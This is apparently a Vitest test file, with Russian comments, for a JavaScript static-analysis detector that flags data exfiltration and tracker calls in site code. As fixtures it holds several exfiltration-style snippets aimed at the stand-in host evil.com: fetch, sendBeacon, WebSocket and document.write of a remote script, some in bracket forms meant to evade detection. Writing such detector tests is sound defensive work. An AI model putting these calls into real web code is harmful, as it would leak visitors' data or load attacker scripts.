import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectExfilCalls } from '../detect-exfil-calls.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });
const has = (src: string, threat: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectExfilCalls(ast, ctx(src)).some((r) => r.threatType === threat);
};

describe('DET-2 — member/bracket формы обходят детектор', () => {
  it('window.fetch(external)', () => {
    expect(has(`window.fetch('//evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it("window['fetch'](external)", () => {
    expect(has(`window['fetch']('//evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it('self.fetch(external)', () => {
    expect(has(`self.fetch('https://evil.com/x')`, 'exfil-fetch')).toBe(true);
  });
  it("navigator['sendBeacon'](external)", () => {
    expect(has(`navigator['sendBeacon']('//evil.com/b')`, 'exfil-beacon')).toBe(true);
  });
  it("document['write'](внешний script)", () => {
    expect(has(`document['write']('<script src="//evil.com/x"></script>')`, 'exfil-document-write')).toBe(true);
  });
  it('new window.WebSocket(external)', () => {
    expect(has(`new window.WebSocket('wss://evil.com/s')`, 'exfil-websocket')).toBe(true);
  });

  it('НЕ-регресс: прямые формы по-прежнему ловятся', () => {
    expect(has(`fetch('//evil.com/x')`, 'exfil-fetch')).toBe(true);
    expect(has(`navigator.sendBeacon('//evil.com/b')`, 'exfil-beacon')).toBe(true);
  });
  it('НЕ-регресс: window.fetch на локальный хост НЕ ловится', () => {
    expect(has(`window.fetch('/api/local')`, 'exfil-fetch')).toBe(false);
  });
});

describe('DEC-2 — локально объявленные короткие имена не считаем трекером', () => {
  it('локальная function ga() (get attribute) — НЕ tracker-call', () => {
    const src = `function ga(el){ return el.getAttribute('href'); } var x = ga(node);`;
    expect(has(src, 'tracker-call')).toBe(false);
  });
  it('локальная const hj = ... — НЕ tracker-call', () => {
    expect(has(`const hj = (a) => a * 2; hj(21);`, 'tracker-call')).toBe(false);
  });
  it('параметр-функция с именем ym — НЕ tracker-call', () => {
    expect(has(`function wrap(ym){ ym(1); } wrap(cb);`, 'tracker-call')).toBe(false);
  });
  it('НЕ-регресс: необъявленный fbq(...) по-прежнему tracker-call', () => {
    expect(has(`fbq('track','Purchase');`, 'tracker-call')).toBe(true);
  });
  it('НЕ-регресс: необъявленный ga(...) (внешний GA) по-прежнему tracker-call', () => {
    expect(has(`ga('send','pageview');`, 'tracker-call')).toBe(true);
  });
});
